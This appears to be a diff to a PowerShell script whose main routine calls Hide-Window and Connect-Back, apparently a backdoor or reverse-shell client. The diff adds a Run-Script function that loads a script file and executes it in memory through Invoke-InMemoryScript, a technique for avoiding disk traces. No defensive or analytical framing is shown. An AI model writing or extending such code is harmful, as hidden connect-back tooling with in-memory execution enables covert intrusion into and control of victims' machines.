@@ -76,6 +76,18 @@ function Connect-Back {
     }
 }
 
+function Run-Script {
+    param (
+        [string]$scriptPath
+    )
+    try {
+        $scriptContent = Get-Content -Path $scriptPath -Raw
+        Invoke-InMemoryScript -code $scriptContent
+    } catch {
+        Write-Error "Error running script: $_"
+    }
+}
+
 # Main execution
 Hide-Window
 Connect-Back
